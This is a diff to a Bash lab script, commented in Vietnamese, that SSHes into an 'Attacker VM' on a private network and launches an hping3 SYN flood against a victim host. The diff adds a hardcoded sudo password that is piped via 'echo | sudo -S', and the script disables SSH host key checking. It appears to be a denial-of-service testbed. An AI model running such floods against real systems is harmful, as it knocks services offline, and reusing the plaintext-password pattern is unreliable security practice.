@@ -30,6 +30,7 @@ set -e
 
 ATTACKER_IP="10.10.1.2"          # IP chính của Attacker VM — chỉ dùng để SSH
 ATTACKER_SSH_USER="kali"          # Username SSH trên Attacker VM
+ATTACKER_SUDO_PASS="kali"         # Mật khẩu sudo trên Attacker VM (dùng cho lab)
 ATTACKER_NS="ns_10"               # Network namespace dùng để tấn công
 ATTACKER_NS_IP="10.10.1.10"       # IP của ns_10 — source IP thực tế của attack
                                    # Dùng ns_10 thay vì eth0 (10.10.1.2) để:
@@ -119,10 +120,12 @@ start_attack() {
     log "[ATTACK][OK] Namespace $ATTACKER_NS (source IP: $ATTACKER_NS_IP) đã sẵn sàng."
 
     # Khởi động hping3 trong namespace ns_10
+    # hping3 cần raw socket (CAP_NET_RAW) — bắt buộc dùng sudo
+    # Dùng echo | sudo -S để tránh prompt password trong batch mode
     log "[ATTACK] Bắt đầu SYN Flood: $ATTACKER_NS_IP → $VICTIM_IP:$VICTIM_PORT"
     HPING_PID=$(ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
         "$ATTACKER_SSH_USER@$ATTACKER_IP" \
-        "ip netns exec $ATTACKER_NS hping3 -S -p $VICTIM_PORT --flood $VICTIM_IP \
+        "echo '$ATTACKER_SUDO_PASS' | sudo -S ip netns exec $ATTACKER_NS hping3 -S -p $VICTIM_PORT --flood $VICTIM_IP \
          > /tmp/hping3.log 2>&1 & echo \$!" 2>/dev/null)
 
     # Xác nhận hping3 đã thực sự khởi động
@@ -149,7 +152,7 @@ stop_attack() {
     log "[ATTACK] Đang dừng SYN Flood..."
     if ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
            "$ATTACKER_SSH_USER@$ATTACKER_IP" \
-           "pkill -f hping3; sleep 1; pgrep hping3 || echo STOPPED" 2>/dev/null | grep -q STOPPED; then
+           "echo '$ATTACKER_SUDO_PASS' | sudo -S pkill -f hping3; sleep 1; pgrep hping3 || echo STOPPED" 2>/dev/null | grep -q STOPPED; then
         log "[ATTACK][OK] hping3 đã dừng trên Attacker VM."
     else
         log "[ATTACK][WARN] Không xác nhận được hping3 đã dừng — kiểm tra thủ công."
